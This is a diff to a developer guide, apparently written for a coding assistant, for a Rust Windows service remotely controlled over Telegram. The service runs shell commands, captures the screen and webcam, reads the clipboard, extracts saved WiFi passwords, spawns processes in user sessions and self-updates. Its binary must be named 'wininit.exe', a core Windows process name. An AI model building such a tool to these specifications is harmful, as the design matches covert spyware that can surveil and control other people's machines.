@@ -88,6 +88,7 @@ cargo check
 
 ### Error Handling
 - Propagate with `?`; avoid `.unwrap()`.
+- Use `.unwrap_or_else(|e| e.into_inner())` for mutex locks (handles poisoned mutex).
 - Never panic in command handlers — return errors to user via Telegram.
 - Use `anyhow::Context` for adding context: `.context("describing what failed")?`
 
@@ -95,6 +96,13 @@ cargo check
 - `tokio::spawn` for detached tasks; `JoinHandle` stored in `ActiveJob` for `/cancel`.
 - Mutex lock must NOT be held across `.await` — extract value first, drop guard, then await.
 - Shell output truncated at 3800 bytes via `truncate_str()`.
+- Read stdout/stderr concurrently via separate `tokio::spawn` tasks to avoid pipe deadlock.
+
+### Session Management (machine/session.rs)
+- `run_in_user_session(exe, args, wait_ms)` — spawns process as active user via `CreateProcessAsUserW`.
+- `capture_in_user_session(exe, args, wait_ms)` — same but captures stdout via pipe.
+- `is_system_session()` — returns `true` when no active console session (`WTSGetActiveConsoleSessionId() == u32::MAX`).
+- Function signatures take `Vec<String>` for args (owned, required for `spawn_blocking` `'static` bound).
 
 ### Project Structure
 ```
@@ -104,29 +112,30 @@ src/
 │   ├── mod.rs        # AgentState, run_until(cfg) with retry loop, truncate_str()
 │   ├── auth.rs       # is_authorized()
 │   ├── md.rs         # MarkdownV2 escape(), send(), send_photo()
-│   ├── router.rs     # Command enum, all handler functions
+│   ├── router.rs     # Command enum, handler functions, ensure_authorized()
 │   └── rate_limit.rs # Token bucket per-command rate limiter
 ├── commands/
 │   ├── ping.rs       # PONG + IP + uptime + version
 │   ├── status.rs     # PID + uptime + job status
 │   ├── screenshot.rs # Screen capture → JPEG
-│   ├── shell.rs      # cmd /C execution + /cancel
-│   ├── sysinfo.rs    # CPU, RAM, disks, network
-│   ├── system.rs     # lock, shutdown, restart, abort, run
+│   ├── shell.rs      # cmd /C execution + /cancel (concurrent stdout/stderr read)
+│   ├── sysinfo.rs    # CPU, RAM, disks, network (saturating_sub for disk calc)
+│   ├── system.rs     # lock, shutdown, restart, abort, run (shared run_shutdown_cmd)
 │   ├── files.rs      # listfiles, getfile
 │   ├── procs.rs      # procs, kill
 │   ├── network.rs    # netstat (interface list)
 │   ├── clipboard.rs  # Read clipboard
-│   ├── location.rs   # IP geolocation
+│   ├── location.rs   # IP geolocation (HTTPS, formatted JSON response)
 │   ├── camera.rs     # Webcam capture
 │   ├── wallpaper.rs  # Get desktop wallpaper
-│   ├── wifi.rs       # Saved WiFi profiles + passwords
-│   ├── audio.rs      # mute, unmute, volume (PowerShell)
+│   ├── wifi.rs       # Saved WiFi profiles + passwords (split_once for parsing)
+│   ├── audio.rs      # mute, unmute, volume (run_powershell helper)
 │   ├── msgbox.rs     # MessageBox Win32 (blocking)
 │   └── notify.rs     # Login watcher (stub)
 ├── machine/
 │   ├── mod.rs
-│   └── identity.rs   # SHA256(hostname+MAC) machine ID (unused currently)
+│   ├── identity.rs   # SHA256(hostname+MAC) machine ID (unused currently)
+│   └── session.rs    # User session process spawning (CreateProcessAsUserW)
 ├── security/
 │   ├── mod.rs
 │   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
@@ -134,7 +143,7 @@ src/
 ├── service/
 │   ├── mod.rs
 │   ├── config.rs     # Registry-only config (DPAPI encrypted)
-│   ├── install.rs    # SCM install/uninstall + setup_home_dir()
+│   ├── install.rs    # SCM install/uninstall + setup_home_dir() + cleanup_old_files()
 │   ├── logging.rs    # DailyFile writer + init_logger()
 │   └── windows_svc.rs # define_windows_service! + SCM dispatch, auto-update on start
 └── updater/
@@ -148,9 +157,14 @@ src/
 - **`/update` (no args):** Auto-checks GitHub for new version, downloads if available.
 - **Flow:** `check_remote_version()` → `find_asset_url()` → `download_file()` → `apply_update()`
 - **Swap order:** stop service → rename exe to .old → copy new → start service → `process::exit(0)`
-- **Cleanup:** `.old` files deleted on next startup.
+- **Cleanup:** `.old` files deleted on next startup via `cleanup_old_files()` in `service::install`.
 - **GitHub Release:** Binary must be named `wininit.exe` as release asset.
 - **CI/CD:** `.github/workflows/release.yml` — triggers on `v*` tag push, builds, creates release with `wininit.exe`.
+
+### Win32 API Notes
+- `LockWorkStation` is in `windows_sys::Win32::System::Shutdown` (not `UI::WindowsAndMessaging`).
+- `DuplicateTokenEx` is in `windows_sys::Win32::Security` (not `System::Threading`).
+- `CreatePipe` parameter `sa` does not need `mut`.
 
 ### Mandatory Rules
 1. Only one instance per machine — enforced via named mutex (`CreateMutexA`).
@@ -163,3 +177,5 @@ src/
 8. Log files in `{home}/logs/agent_YYYY-MM-DD.log`, daily rotation via `DailyFile` writer.
 9. Config via CLI args (`--run TOKEN UID`, `--install TOKEN UID`) — no .env, no baked token.
 10. `run_until()` takes `AppConfig` as parameter; service mode loads from registry.
+11. Auth check uses `ensure_authorized()` helper in `router.rs` — do not duplicate auth logic.
+12. All commands that could be abused have rate limits in `rate_limit.rs`.
